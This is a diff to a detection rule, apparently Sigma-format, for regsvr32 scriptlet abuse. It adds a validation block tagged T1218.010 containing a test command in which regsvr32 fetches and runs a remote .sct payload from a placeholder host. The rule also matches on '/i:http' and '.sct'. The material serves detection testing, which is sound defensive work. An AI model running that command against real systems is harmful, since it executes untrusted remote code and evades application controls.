@@ -21,6 +21,10 @@ detection:
       - '/i:http'
       - '.sct'
   condition: selection and scriptlet
+validation:
+  atomic: T1218.010
+  fire: |-
+    regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
 falsepositives:
   - Rare; legitimate COM registration does not fetch remote scriptlets
 level: critical
